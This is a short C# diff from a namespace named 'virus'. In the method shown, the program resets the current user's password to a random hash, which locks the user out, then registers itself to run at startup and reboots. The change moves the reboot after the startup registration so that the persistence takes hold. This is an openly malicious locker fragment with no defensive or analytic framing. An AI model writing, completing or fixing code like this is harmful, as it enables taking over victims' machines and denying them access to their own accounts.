@@ -175,8 +175,9 @@ namespace virus
         {
             Random x=new Random();
             ResetUserPassword(System.Environment.UserName,MD5(GenerateRandomString(x.Next())));
-            reboot();
             SetMeStart(true);
+            reboot();
+            
             
         }
     }
